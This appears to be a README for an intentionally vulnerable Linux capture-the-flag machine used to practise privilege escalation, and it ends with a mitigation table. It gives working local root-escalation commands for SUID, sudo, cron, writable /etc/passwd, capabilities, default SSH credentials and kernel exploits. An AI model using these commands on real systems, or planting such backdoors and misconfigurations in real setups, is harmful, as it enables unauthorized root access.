# Linux Privilege Escalation CTF Machine

![CTF Level](https://img.shields.io/badge/Level-Medium-orange)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey)
![Category](https://img.shields.io/badge/Category-PrivEsc-blue)

A deliberately vulnerable Linux machine with multiple privilege escalation vectors. Perfect for practicing penetration testing skills in a controlled environment.

## Table of Contents
1. [Machine Overview](#machine-overview)
2. [Privilege Escalation Methods](#privilege-escalation-methods)
   - [1. SUID Binary](#1-suid-binary)
   - [2. Sudo Misconfiguration](#2-sudo-misconfiguration)
   - [3. Cron Job](#3-cron-job)
   - [4. Writable /etc/passwd](#4-writable-etcpasswd)
   - [5. Capabilities](#5-capabilities)
   - [6. SSH Backdoor](#6-ssh-backdoor)
   - [7. Kernel Exploits](#7-kernel-exploits)
3. [Setup Instructions](#setup-instructions)
4. [Exploitation Walkthrough](#exploitation-walkthrough)
5. [Mitigation Guide](#mitigation-guide)

## Machine Overview

**Difficulty**: Medium  
**Learning Objectives**:
- Identify multiple privilege escalation vectors
- Practice Linux system enumeration
- Understand security misconfigurations
- Learn proper mitigation techniques

**Default Credentials**:
- User: `hacker`
- Password: `Password123!`

## Privilege Escalation Methods

### 1. SUID Binary
**Location**: `/usr/bin/suid-sh`  
**Vulnerability**: Custom SUID binary that executes bash with root privileges  
**Exploitation**:
```bash
/usr/bin/suid-sh
```
Why it works: The binary has the SUID bit set and is owned by root.

### 2. Sudo Misconfiguration

Location: /etc/sudoers
Vulnerability: All users can run any command as root without a password

#### Exploitation:
```bash
sudo su
```
Why it works: The NOPASSWD: ALL directive in sudoers file.

### 3. Cron Job

Location: /etc/cron.d/backdoor
Vulnerability: World-writable script executed by root every minute

#### Exploitation:
```Bash
echo 'chmod 4755 /bin/bash' > /opt/backdoor.sh
# Wait 1 minute
/bin/bash -p
```
Why it works: Cron runs as root and executes our malicious script.

### 4. Writable /etc/passwd

Location: /etc/passwd
Vulnerability: World-writable system file

#### Exploitation:
```Bash
openssl passwd -1 -salt abc Password123
echo 'root2:$1$abc$TKhNXK5ZJBXvJ9XqFn1nq.:0:0:root:/root:/bin/bash' >> /etc/passwd
su root2
```
Why it works: We can add a new root user.

### 5. Capabilities

Location: Python binary
Vulnerability: cap_setuid capability set

#### Exploitation:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
Why it works: Python can elevate privileges due to its capabilities.

### 6. SSH Backdoor

Location: SSH service
Vulnerability: Pre-configured backdoor account
#### Exploitation:
```Bash
ssh hacker@<IP>
```
Why it works: Weak credentials and allowed SSH access.
### 7. Kernel Exploits

Location: /tmp/dirtypipe and /tmp/dirtycow
Vulnerability: Unpatched kernel vulnerabilities

#### Exploitation:
```Bash
# If kernel is vulnerable:
/tmp/dirtypipe
# or
/tmp/dirtycow
```
Why it works: Kernel vulnerabilities allow privilege escalation.
#### Setup Instructions
#### Using Vagrant
```bash
vagrant up
vagrant ssh
```
#### Exploitation Walkthrough

    Initial Access:
    ```Bash
    ssh hacker@<IP>  # Password: Password123!
    ```
### Enumeration:
```Bash
find / -perm -4000 2>/dev/null      # Check SUID binaries
sudo -l                             # Check sudo permissions
cat /etc/crontab                    # Check cron jobs
ls -la /etc/passwd                  # Check file permissions
getcap -r / 2>/dev/null             # Check capabilities
uname -a                            # Check kernel version
```
### Choose an Exploit Method from the list above.

#### Mitigation Guide
~~~
Vulnerability	         | Secure Configuration
SUID Binary	            | chmod u-s /usr/bin/suid-sh
Sudo Misconfig	         | Remove NOPASSWD: ALL from /etc/sudoers
Cron Job	               | chmod 700 /opt/backdoor.sh
/etc/passwd	          | chmod 644 /etc/passwd
Capabilities	         | setcap -r $(which python3)
SSH Backdoor	         | userdel -r hacker
Kernel	Update system: | apt update && apt upgrade
~~~
### Recommended Linux Versions
```
Distribution	Version	Kernel	Why Recommended
Ubuntu	16.04 LTS (Xenial)	4.4.x	Perfect for DirtyCow (CVE-2016-5195) and older vulnerabilities
Ubuntu	18.04 LTS (Bionic)	5.4.x	Good balance for SUID/sudo exploits and some kernel vulns
Debian	10 (Buster)	4.19.x	Stable with writable /etc/passwd and cron issues
Fedora	33	5.10.x	Ideal for DirtyPipe (CVE-2022-0847)
```

